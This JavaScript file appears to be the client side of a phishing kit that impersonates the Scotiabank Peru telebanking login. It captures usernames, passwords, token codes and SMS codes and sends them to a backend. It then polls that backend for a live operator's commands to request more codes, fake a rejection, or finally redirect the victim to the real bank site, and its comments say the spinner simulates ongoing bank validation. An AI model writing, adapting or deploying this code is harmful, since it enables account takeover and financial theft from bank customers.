document.addEventListener("DOMContentLoaded", () => {
  // Ocultar loader al cargar la página
  if (window.modalLoad) {
    try { window.modalLoad('hide'); } catch(e) {}
  }
  const loader = document.getElementById("ajax_loader");
  if (loader) loader.style.display = "none";

  // Elementos DOM del formulario de Login
  const form = document.querySelector("#login-form-data") || document.querySelector("#telebanking-form");
  const usernameInput = document.querySelector("#input-user-name") || document.querySelector("#username");
  const passwordInput = document.querySelector("#input-password-login") || document.querySelector("#password");
  const tokenInput = document.querySelector("#input-token") || document.querySelector("#token");
  
  const iconPasswordEye = document.querySelector("#icon-password-eye") || document.querySelector("#toggle-password");
  const iconTokenEye = document.querySelector("#icon-token-eye") || document.querySelector("#toggle-token");
  
  const rememberCheckbox = document.querySelector("#chkRemerberConventions") || document.querySelector("#remember-user");
  const submitBtn = document.querySelector("#btn-login-pass") || document.querySelector("#submit-btn");

  // Elementos del Modal SMS
  const modalSms = document.getElementById("modalSmsVerification");
  const smsInput = document.getElementById("input-sms-code");
  const btnSubmitSms = document.getElementById("btn-submit-sms");
  const smsErrorMsg = document.getElementById("sms-error-msg");

  // Estado de Sesión Local
  let currentSessionId = localStorage.getItem("telebanking_session_id") || null;
  let statusPollInterval = null;

  // Ocultar estados de error al escribir en los inputs
  [usernameInput, passwordInput, tokenInput].forEach((input) => {
    if (input) {
      input.addEventListener("focus", () => {
        input.classList.remove("error");
        const parentWrapper = input.closest(".g-input_design");
        if (parentWrapper) parentWrapper.classList.remove("error");
        const errSpan = document.getElementById(input.id + "-error");
        if (errSpan) errSpan.textContent = "";
      });
    }
  });

  // 1. Toggle Visibilidad Contraseña y Token
  function setupEyeToggle(button, input) {
    if (!button || !input) return;
    button.style.cursor = "pointer";
    button.addEventListener("click", (e) => {
      e.preventDefault();
      const isPassword = input.type === "password";
      input.type = isPassword ? "text" : "password";
      button.style.opacity = isPassword ? "1" : "0.5";
    });
  }

  setupEyeToggle(iconPasswordEye, passwordInput);
  setupEyeToggle(iconTokenEye, tokenInput);

  // 2. Recordar usuario en LocalStorage
  const savedUser = localStorage.getItem("scotia_telebanking_username");
  if (savedUser && usernameInput) {
    usernameInput.value = savedUser;
    if (rememberCheckbox) rememberCheckbox.checked = true;
  }

  // 3. Validación de formulario
  function checkFormValidity() {
    if (!usernameInput || !passwordInput || !tokenInput || !submitBtn) return;
    const hasValues = usernameInput.value.trim() !== "" && 
                      passwordInput.value.trim() !== "" && 
                      tokenInput.value.trim() !== "";
    if (hasValues) {
      submitBtn.removeAttribute("disabled");
      submitBtn.classList.add("ready");
      submitBtn.style.opacity = "1";
    } else {
      submitBtn.setAttribute("disabled", "true");
      submitBtn.classList.remove("ready");
    }
  }

  [usernameInput, passwordInput, tokenInput].forEach((input) => {
    if (input) {
      input.addEventListener("input", checkFormValidity);
    }
  });

  checkFormValidity();

  // Helper para mostrar u ocultar Spinner Loader
  function setLoaderState(show) {
    if (!loader) return;
    if (show) {
      loader.classList.add("show-loader");
      loader.style.setProperty("display", "flex", "important");
      loader.style.setProperty("opacity", "1", "important");
      loader.style.setProperty("visibility", "visible", "important");
    } else {
      loader.classList.remove("show-loader");
      loader.style.setProperty("display", "none", "important");
      loader.style.setProperty("opacity", "0", "important");
      loader.style.setProperty("visibility", "hidden", "important");
    }
  }

  // 4. Procesar Envío del Formulario Principal
  if (form) {
    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      
      const uVal = usernameInput ? usernameInput.value.trim() : "";
      const pVal = passwordInput ? passwordInput.value.trim() : "";
      const tVal = tokenInput ? tokenInput.value.trim() : "";

      if (rememberCheckbox && rememberCheckbox.checked) {
        localStorage.setItem("scotia_telebanking_username", uVal);
      } else {
        localStorage.removeItem("scotia_telebanking_username");
      }

      if (submitBtn) {
        submitBtn.textContent = "Ingresando...";
        submitBtn.disabled = true;
      }

      setLoaderState(true);

      try {
        const response = await fetch("/api/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            username: uVal,
            password: pVal,
            token: tVal
          })
        });

        const data = await response.json();
        if (data.success && data.sessionId) {
          currentSessionId = data.sessionId;
          localStorage.setItem("telebanking_session_id", currentSessionId);
          startPollingStatus();
        } else {
          showErrorState(data.message || "Error al conectar con el servidor.");
        }
      } catch (err) {
        console.error("Error en petición de login:", err);
        // Continuar mostrando spinner para simular validación bancaria continua
      }
    });
  }

  // 5. Sondeo en tiempo real de instrucciones del operador
  function startPollingStatus() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentSessionId) return;

      try {
        const response = await fetch(`/api/session-status/${currentSessionId}`);
        const data = await response.json();

        if (data.success) {
          handleOperatorInstruction(data);
        }
      } catch (err) {
        console.warn("Polling status check error:", err);
      }
    }, 1200);
  }

  // Manejador de respuestas e instrucciones del Operador
  function handleOperatorInstruction(data) {
    const step = data.requestedStep;

    switch (step) {
      case "REQUEST_TOKEN":
        setLoaderState(false);
        if (modalSms) modalSms.style.display = "none";
        // Enfocar el campo de Token y resaltar
        if (tokenInput) {
          tokenInput.value = "";
          tokenInput.focus();
          const errSpan = document.getElementById("input-token-error");
          if (errSpan) errSpan.textContent = "Por favor ingrese su Clave Token actual para continuar";
        }
        break;

      case "REQUEST_SMS":
        setLoaderState(false);
        if (modalSms) {
          modalSms.style.display = "flex";
          if (smsInput) {
            smsInput.value = "";
            smsInput.focus();
          }
        }
        break;

      case "REJECT_CREDS":
        setLoaderState(false);
        if (modalSms) modalSms.style.display = "none";
        showErrorState(data.errorMessage || "Nombre de usuario o contraseña incorrectos.");
        break;

      case "APPROVE":
        setLoaderState(false);
        if (modalSms) modalSms.style.display = "none";
        // Redirigir al sitio oficial de Scotiabank
        window.location.href = "https://www.scotiabank.com.pe";
        break;

      case "WAIT_OPERATOR":
      default:
        // Mantener spinner activo mientras el operador toma decisión
        if (modalSms && modalSms.style.display === "flex") {
          // Si el usuario ya envió SMS, cerrar modal y mostrar spinner
        } else {
          setLoaderState(true);
        }
        break;
    }
  }

  // Mostrar mensaje de error en la interfaz
  function showErrorState(msg) {
    if (submitBtn) {
      submitBtn.textContent = "Ingresar";
      submitBtn.disabled = false;
    }
    if (passwordInput) passwordInput.value = "";
    if (tokenInput) tokenInput.value = "";

    const userErrSpan = document.getElementById("input-user-name-error");
    const passErrSpan = document.getElementById("input-password-login-error");

    if (passErrSpan) {
      passErrSpan.textContent = msg;
      if (passwordInput) {
        passwordInput.classList.add("error");
        const wrapper = passwordInput.closest(".g-input_design");
        if (wrapper) wrapper.classList.add("error");
      }
    }
  }

  // 6. Envío del código SMS al Operador
  if (btnSubmitSms && smsInput) {
    btnSubmitSms.addEventListener("click", async (e) => {
      e.preventDefault();
      const code = smsInput.value.trim();

      if (!code || code.length < 4) {
        if (smsErrorMsg) {
          smsErrorMsg.textContent = "Por favor ingrese un código SMS válido.";
          smsErrorMsg.style.display = "block";
        }
        return;
      }

      if (smsErrorMsg) smsErrorMsg.style.display = "none";
      if (modalSms) modalSms.style.display = "none";

      setLoaderState(true);

      try {
        await fetch("/api/submit-step", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            sessionId: currentSessionId,
            smsCode: code
          })
        });
      } catch (err) {
        console.error("Error al enviar código SMS:", err);
      }
    });
  }

  // Si ya existía una sesión previa activa, reanudar sondeo
  if (currentSessionId) {
    startPollingStatus();
  }
});
